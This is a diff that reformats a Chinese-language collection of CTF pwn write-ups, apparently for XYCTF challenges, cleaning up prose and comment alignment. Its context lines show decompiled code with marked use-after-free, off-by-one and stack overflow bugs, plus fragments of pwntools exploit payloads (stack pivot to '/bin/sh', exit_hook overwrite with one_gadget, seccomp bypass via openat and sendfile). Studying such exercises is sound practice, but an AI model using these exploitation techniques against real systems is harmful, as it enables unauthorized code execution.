@@ -109,8 +109,7 @@ sandbox
  0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
  0013: 0x06 0x00 0x00 0x00000000  return KILL
 ```
-ban 了不少常见的系统调用
-这里介绍 openat + sendfile 的方式读文件
+ban 掉不少常见系统调用，这里用 openat + sendfile 读文件。
 ```
 int openat(int dirfd, const char *pathname, int flags, mode_t mode);
 dirfd: 表示目录的文件描述符。如果是 AT_FDCWD，则相对路径是从当前工作目录开始查找。
@@ -175,8 +174,7 @@ __int64 vuln()
 ```
 
 ### 分析
-就正常栈溢出，但是找不到 '/bin/sh' 字符
-所以考虑栈迁移，迁到已知地址写 '/bin/sh'
+就是普通栈溢出，但程序里找不到 `/bin/sh` 字符串，于是考虑栈迁移，迁到已知地址再写。
 
 ### exp
 ```python
@@ -207,7 +205,7 @@ payload += p64(0x401826)
 io.recvuntil(b'static_link? ret2??')
 io.sendline(payload)
 
-payload = b'/bin/sh\0' * 4 
+payload = b'/bin/sh\0' * 4
 payload += p64(datas)
 payload += p64(rdi)
 payload += p64(datas - 0x10)
@@ -243,11 +241,7 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 ### 分析
-知道了 `libc` 地址
-利用 scanf 可以在任意地址写任意内容
-调试发现 `libc` 和 `ld` 有固定偏移
-所以可以直接写 `ld` 上的 **exit_hook(__rtld_lock_lock_recursive/__rtld_lock_unlock_recursive)**
-写为 `one_gadget`.
+拿到 libc 地址后，`scanf` 能在任意地址写任意内容；调一下会发现 libc 与 ld 的偏移固定，于是直接改写 ld 上的 `exit_hook`（`__rtld_lock_lock_recursive` / `__rtld_lock_unlock_recursive`）为 one_gadget。
 
 ### exp
 ```python
@@ -272,7 +266,7 @@ info('libc base: ' + hex(libc.address))
 # info('_dl_fini: ' + hex(dl_fini))
 exit_hook = libc.address + 0x222f68
 
-payload = b'%8$s\0\0\0\0'+p64(exit_hook)*3 
+payload = b'%8$s\0\0\0\0'+p64(exit_hook)*3
 io.send(payload)
 
 io.sendline(p64(0x4012C2))
@@ -285,20 +279,20 @@ heap 基础题
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  int v4; // [rsp+0h] [rbp-130h] BYREF
-  int v5; // [rsp+4h] [rbp-12Ch]
-  int v6; // [rsp+8h] [rbp-128h]
-  int i; // [rsp+Ch] [rbp-124h]
-  FILE *stream; // [rsp+10h] [rbp-120h]
-  size_t n; // [rsp+18h] [rbp-118h]
-  void *ptr; // [rsp+20h] [rbp-110h]
-  size_t v11; // [rsp+28h] [rbp-108h]
-  size_t v12; // [rsp+30h] [rbp-100h]
-  void *v13; // [rsp+38h] [rbp-F8h]
-  char s2[64]; // [rsp+40h] [rbp-F0h] BYREF
-  char src[64]; // [rsp+80h] [rbp-B0h] BYREF
-  _BYTE v16[104]; // [rsp+C0h] [rbp-70h] BYREF
-  unsigned __int64 v17; // [rsp+128h] [rbp-8h]
+  int v4;                // [rsp+0h] [rbp-130h] BYREF
+  int v5;                // [rsp+4h] [rbp-12Ch]
+  int v6;                // [rsp+8h] [rbp-128h]
+  int i;                 // [rsp+Ch] [rbp-124h]
+  FILE *stream;          // [rsp+10h] [rbp-120h]
+  size_t n;              // [rsp+18h] [rbp-118h]
+  void *ptr;             // [rsp+20h] [rbp-110h]
+  size_t v11;            // [rsp+28h] [rbp-108h]
+  size_t v12;            // [rsp+30h] [rbp-100h]
+  void *v13;             // [rsp+38h] [rbp-F8h]
+  char s2[64];           // [rsp+40h] [rbp-F0h] BYREF
+  char src[64];          // [rsp+80h] [rbp-B0h] BYREF
+  _BYTE v16[104];        // [rsp+C0h] [rbp-70h] BYREF
+  unsigned __int64 v17;  // [rsp+128h] [rbp-8h]
 
   v17 = __readfsqword(0x28u);
   setbuf(stdout, 0LL);
@@ -537,10 +531,10 @@ io.interactive()
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  unsigned __int64 i; // [rsp+0h] [rbp-120h]
-  int *v5; // [rsp+8h] [rbp-118h]
-  _DWORD buf[66]; // [rsp+10h] [rbp-110h] BYREF
-  unsigned __int64 v7; // [rsp+118h] [rbp-8h]
+  unsigned __int64 i;   // [rsp+0h] [rbp-120h]
+  int *v5;              // [rsp+8h] [rbp-118h]
+  _DWORD buf[66];       // [rsp+10h] [rbp-110h] BYREF
+  unsigned __int64 v7;  // [rsp+118h] [rbp-8h]
 
   v7 = __readfsqword(0x28u);
   init(argc, argv, envp);
@@ -614,9 +608,9 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 
 void __cdecl GuestBook()
 {
-  int index; // [rsp+Ch] [rbp-224h] BYREF
-  char name[32][16]; // [rsp+10h] [rbp-220h] BYREF
-  unsigned __int8 id[32]; // [rsp+210h] [rbp-20h] BYREF
+  int index;               // [rsp+Ch] [rbp-224h] BYREF
+  char name[32][16];       // [rsp+10h] [rbp-220h] BYREF
+  unsigned __int8 id[32];  // [rsp+210h] [rbp-20h] BYREF
 
   puts("Welcome to starRail.");
   puts("please enter your name and id");
@@ -627,7 +621,7 @@ void __cdecl GuestBook()
       puts("index");
       scanf("%d", &index);
       if ( index <= 32 )
-        break;                                  // 32
+        break;             // 32
       puts("out of range");
     }
     if ( index < 0 )
@@ -692,8 +686,8 @@ io.interactive()
 ```C
 int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
-  unsigned int choice; // [rsp+4h] [rbp-Ch] BYREF
-  unsigned __int64 v4; // [rsp+8h] [rbp-8h]
+  unsigned int choice;     // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v4;     // [rsp+8h] [rbp-8h]
 
   v4 = __readfsqword(0x28u);
   init();
@@ -701,10 +695,10 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
   {
     while ( 1 )
     {
-      menu();                                   //   puts("1. create note");
-                                                //   puts("2. delete note");
-                                                //   puts("3. show content");
-                                                //   printf(">>> ");
+      menu();              //   puts("1. create note");
+                           //   puts("2. delete note");
+                           //   puts("3. show content");
+                           //   printf(">>> ");
       scanf("%u", &choice);
       if ( choice != 1 )
         break;
@@ -728,9 +722,9 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 
 void __cdecl create()
 {
-  unsigned int idxx; // ebx
-  unsigned int c; // [rsp+4h] [rbp-1Ch] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-18h]
+  unsigned int idxx;       // ebx
+  unsigned int c;          // [rsp+4h] [rbp-1Ch] BYREF
+  unsigned __int64 v2;     // [rsp+8h] [rbp-18h]
 
   v2 = __readfsqword(0x28u);
   puts("please input note idx");
@@ -750,22 +744,22 @@ void __cdecl create()
 
 void __cdecl delete()
 {
-  unsigned int idx; // [rsp+Ch] [rbp-14h] BYREF
-  unsigned __int64 v1; // [rsp+18h] [rbp-8h]
+  unsigned int idx;        // [rsp+Ch] [rbp-14h] BYREF
+  unsigned __int64 v1;     // [rsp+18h] [rbp-8h]
 
   v1 = __readfsqword(0x28u);
   puts("please input note idx");
   scanf("%u", &idx);
   if ( idx <= 0xF )
-    free(note_addr[idx]);                       // uaf
+    free(note_addr[idx]);  // uaf
   else
     puts("idx error");
 }
 
 void __cdecl show()
 {
-  unsigned int idx; // [rsp+4h] [rbp-Ch] BYREF
-  unsigned __int64 v1; // [rsp+8h] [rbp-8h]
+  unsigned int idx;        // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v1;     // [rsp+8h] [rbp-8h]
 
   v1 = __readfsqword(0x28u);
   puts("please input note idx");
@@ -959,20 +953,20 @@ off-by-one 加 UAF。
 ```C
 int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
-  int choice; // [rsp+Ch] [rbp-4h]
+  int choice;                    // [rsp+Ch] [rbp-4h]
 
   init(argc, argv, envp);
   while ( 1 )
   {
     while ( 1 )
     {
-      menu();                                   //   puts("Welcome to XYCTF");
-                                                //   puts("[1] add_chunk()");
-                                                //   puts("[2] delete_chunk()");
-                                                //   puts("[3] view_chunk()");
-                                                //   puts("[4] edit_chunk()");
-                                                //   puts("[5] exit()");
-                                                //   return printf(">>> ");
+      menu();                    //   puts("Welcome to XYCTF");
+                                 //   puts("[1] add_chunk()");
+                                 //   puts("[2] delete_chunk()");
+                                 //   puts("[3] view_chunk()");
+                                 //   puts("[4] edit_chunk()");
+                                 //   puts("[5] exit()");
+                                 //   return printf(">>> ");
       choice = get_choice();
       if ( choice != 1 )
         break;
@@ -1001,10 +995,10 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 
 unsigned __int64 add_chunk()
 {
-  unsigned int v0; // ebx
-  unsigned int idx; // [rsp+0h] [rbp-20h] BYREF
-  int size; // [rsp+4h] [rbp-1Ch] BYREF
-  unsigned __int64 v4; // [rsp+8h] [rbp-18h]
+  unsigned int v0;               // ebx
+  unsigned int idx;              // [rsp+0h] [rbp-20h] BYREF
+  int size;                      // [rsp+4h] [rbp-1Ch] BYREF
+  unsigned __int64 v4;           // [rsp+8h] [rbp-18h]
 
   v4 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1041,8 +1035,8 @@ unsigned __int64 add_chunk()
 
 unsigned __int64 delete_chunk()
 {
-  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+  unsigned int v1;               // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2;           // [rsp+8h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1053,7 +1047,7 @@ unsigned __int64 delete_chunk()
     {
       if ( chunk_list[v1] )
       {
-        free(chunk_list[v1]);                   // uaf
+        free(chunk_list[v1]);    // uaf
         inused_list[v1] = 0;
       }
       else
@@ -1075,8 +1069,8 @@ unsigned __int64 delete_chunk()
 
 unsigned __int64 view_chunk()
 {
-  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+  unsigned int v1;               // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2;           // [rsp+8h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1104,8 +1098,8 @@ unsigned __int64 view_chunk()
 
 unsigned __int64 edit_chunk()
 {
-  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+  unsigned int v1;               // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2;           // [rsp+8h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1133,7 +1127,7 @@ unsigned __int64 edit_chunk()
 
 ssize_t __fastcall read_data(void *a1, int a2)
 {
-  return read(0, a1, (a2 + 1));                 // off by one
+  return read(0, a1, (a2 + 1));  // off by one
 }
 ```
 
@@ -1263,8 +1257,8 @@ sw $zero, 0x14($sp)
 
 la $a0, 0xc($sp)
 li $a1, 0
-li $a2, 0               
-                
+li $a2, 0
+
 li $v0, 4011
 syscall
 nop
@@ -1359,18 +1353,18 @@ io.interactive()
 ```C
 int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
-  int choice; // [rsp+Ch] [rbp-4h]
+  int choice;             // [rsp+Ch] [rbp-4h]
 
   init(argc, argv, envp);
   while ( 1 )
   {
     while ( 1 )
     {
-      menu();                                   //   puts("[1] add_chunk()");
-                                                //   puts("[2] delete_chunk()");
-                                                //   puts("[3] view_chunk()");
-                                                //   puts("[4] exit()");
-                                                //   return printf(">>> ");
+      menu();             //   puts("[1] add_chunk()");
+                          //   puts("[2] delete_chunk()");
+                          //   puts("[3] view_chunk()");
+                          //   puts("[4] exit()");
+                          //   return printf(">>> ");
       choice = get_choice();
       if ( choice != 1 )
         break;
@@ -1396,11 +1390,11 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 
 void add_chunk()
 {
-  unsigned __int64 idx; // [rsp+8h] [rbp-28h] BYREF
-  size_t size; // [rsp+10h] [rbp-20h] BYREF
-  msg *ptr; // [rsp+18h] [rbp-18h]
-  void *buf; // [rsp+20h] [rbp-10h]
-  unsigned __int64 v4; // [rsp+28h] [rbp-8h]
+  unsigned __int64 idx;   // [rsp+8h] [rbp-28h] BYREF
+  size_t size;            // [rsp+10h] [rbp-20h] BYREF
+  msg *ptr;               // [rsp+18h] [rbp-18h]
+  void *buf;              // [rsp+20h] [rbp-10h]
+  unsigned __int64 v4;    // [rsp+28h] [rbp-8h]
 
   v4 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1440,9 +1434,9 @@ void add_chunk()
 
 void delete_chunk()
 {
-  unsigned __int64 idx; // [rsp+8h] [rbp-18h] BYREF
-  msg *ptr; // [rsp+10h] [rbp-10h]
-  unsigned __int64 v2; // [rsp+18h] [rbp-8h]
+  unsigned __int64 idx;   // [rsp+8h] [rbp-18h] BYREF
+  msg *ptr;               // [rsp+10h] [rbp-10h]
+  unsigned __int64 v2;    // [rsp+18h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   printf("[?] Enter chunk id: ");
@@ -1456,7 +1450,7 @@ void delete_chunk()
       {
         free(chunk_list[idx]);
         free(ptr->con);
-        ptr->flag = 0LL;                        // uaf
+        ptr->flag = 0LL;  // uaf
       }
       else
       {
@@ -1476,7 +1470,7 @@ void delete_chunk()
 
 void view_chunk()
 {
-  _QWORD idx[2]; // [rsp+0h] [rbp-10h] BYREF
+  _QWORD idx[2];          // [rsp+0h] [rbp-10h] BYREF
 
   idx[1] = __readfsqword(0x28u);
   printf("[?] Enter chunk id: ");
@@ -1594,18 +1588,18 @@ io.interactive()
 ```C
 int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 {
-  int choice; // [rsp+Ch] [rbp-4h]
+  int choice;            // [rsp+Ch] [rbp-4h]
 
   init(argc, argv, envp);
   while ( 1 )
   {
     while ( 1 )
     {
-      menu();                                   //   puts("[1] add_chunk()");
-                                                //   puts("[2] delete_chunk()");
-                                                //   puts("[3] view_chunk()");
-                                                //   puts("[4] exit()");
-                                                //   return printf(">>> ");
+      menu();            //   puts("[1] add_chunk()");
+                         //   puts("[2] delete_chunk()");
+                         //   puts("[3] view_chunk()");
+                         //   puts("[4] exit()");
+                         //   return printf(">>> ");
       choice = get_choice();
       if ( choice != 1 )
         break;
@@ -1629,8 +1623,8 @@ int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
 
 __int64 get_choice()
 {
-  unsigned int v1; // [rsp+4h] [rbp-Ch] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+  unsigned int v1;       // [rsp+4h] [rbp-Ch] BYREF
+  unsigned __int64 v2;   // [rsp+8h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   scanf("%u", &v1);
@@ -1639,11 +1633,11 @@ __int64 get_choice()
 
 unsigned __int64 add_chunk()
 {
-  unsigned __int64 idx; // [rsp+8h] [rbp-28h] BYREF
-  __int64 size; // [rsp+10h] [rbp-20h] BYREF
-  msg *ptr; // [rsp+18h] [rbp-18h]
-  void *buf; // [rsp+20h] [rbp-10h]
-  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+  unsigned __int64 idx;  // [rsp+8h] [rbp-28h] BYREF
+  __int64 size;          // [rsp+10h] [rbp-20h] BYREF
+  msg *ptr;              // [rsp+18h] [rbp-18h]
+  void *buf;             // [rsp+20h] [rbp-10h]
+  unsigned __int64 v5;   // [rsp+28h] [rbp-8h]
 
   v5 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1691,9 +1685,9 @@ unsigned __int64 add_chunk()
 
 unsigned __int64 delete_chunk()
 {
-  unsigned __int64 idx; // [rsp+8h] [rbp-18h] BYREF
-  msg *ptr; // [rsp+10h] [rbp-10h]
-  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+  unsigned __int64 idx;  // [rsp+8h] [rbp-18h] BYREF
+  msg *ptr;              // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3;   // [rsp+18h] [rbp-8h]
 
   v3 = __readfsqword(0x28u);
   printf("[?] Enter chunk id: ");
@@ -1728,8 +1722,8 @@ unsigned __int64 delete_chunk()
 
 unsigned __int64 view_chunk()
 {
-  unsigned __int64 idx; // [rsp+0h] [rbp-10h] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+  unsigned __int64 idx;  // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v2;   // [rsp+8h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   printf("[?] Enter chunk id: ");
@@ -1867,7 +1861,7 @@ io.interactive()
 ```C
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  int choice; // [rsp+Ch] [rbp-4h]
+  int choice;           // [rsp+Ch] [rbp-4h]
 
   init();
   while ( 1 )
@@ -1904,7 +1898,7 @@ __int64 init()
 
 __int64 sandbox()
 {
-  __int64 v1; // [rsp+8h] [rbp-8h]
+  __int64 v1;           // [rsp+8h] [rbp-8h]
 
   v1 = seccomp_init(2147418112LL);
   seccomp_rule_add(v1, 0LL, 59LL, 0LL);
@@ -1924,11 +1918,11 @@ int menu()
 
 unsigned __int64 add_chunk()
 {
-  unsigned __int64 v1; // [rsp+8h] [rbp-28h] BYREF
-  size_t size; // [rsp+10h] [rbp-20h] BYREF
-  _QWORD *v3; // [rsp+18h] [rbp-18h]
-  void *buf; // [rsp+20h] [rbp-10h]
-  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+  unsigned __int64 v1;  // [rsp+8h] [rbp-28h] BYREF
+  size_t size;          // [rsp+10h] [rbp-20h] BYREF
+  _QWORD *v3;           // [rsp+18h] [rbp-18h]
+  void *buf;            // [rsp+20h] [rbp-10h]
+  unsigned __int64 v5;  // [rsp+28h] [rbp-8h]
 
   v5 = __readfsqword(0x28u);
   printf("[?] please input chunk_idx: ");
@@ -1976,9 +1970,9 @@ unsigned __int64 add_chunk()
 
 unsigned __int64 delete_chunk()
 {
-  unsigned __int64 v1; // [rsp+8h] [rbp-18h] BYREF
-  __int64 v2; // [rsp+10h] [rbp-10h]
-  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+  unsigned __int64 v1;  // [rsp+8h] [rbp-18h] BYREF
+  __int64 v2;           // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3;  // [rsp+18h] [rbp-8h]
 
   v3 = __readfsqword(0x28u);
   printf("[?] Enter chunk id: ");
@@ -2013,8 +2007,8 @@ unsigned __int64 delete_chunk()
 
 unsigned __int64 view_chunk()
 {
-  unsigned __int64 v1; // [rsp+0h] [rbp-10h] BYREF
-  unsigned __int64 v2; // [rsp+8h] [rbp-8h]
+  unsigned __int64 v1;  // [rsp+0h] [rbp-10h] BYREF
+  unsigned __int64 v2;  // [rsp+8h] [rbp-8h]
 
   v2 = __readfsqword(0x28u);
   printf("[?] Enter chunk id: ");
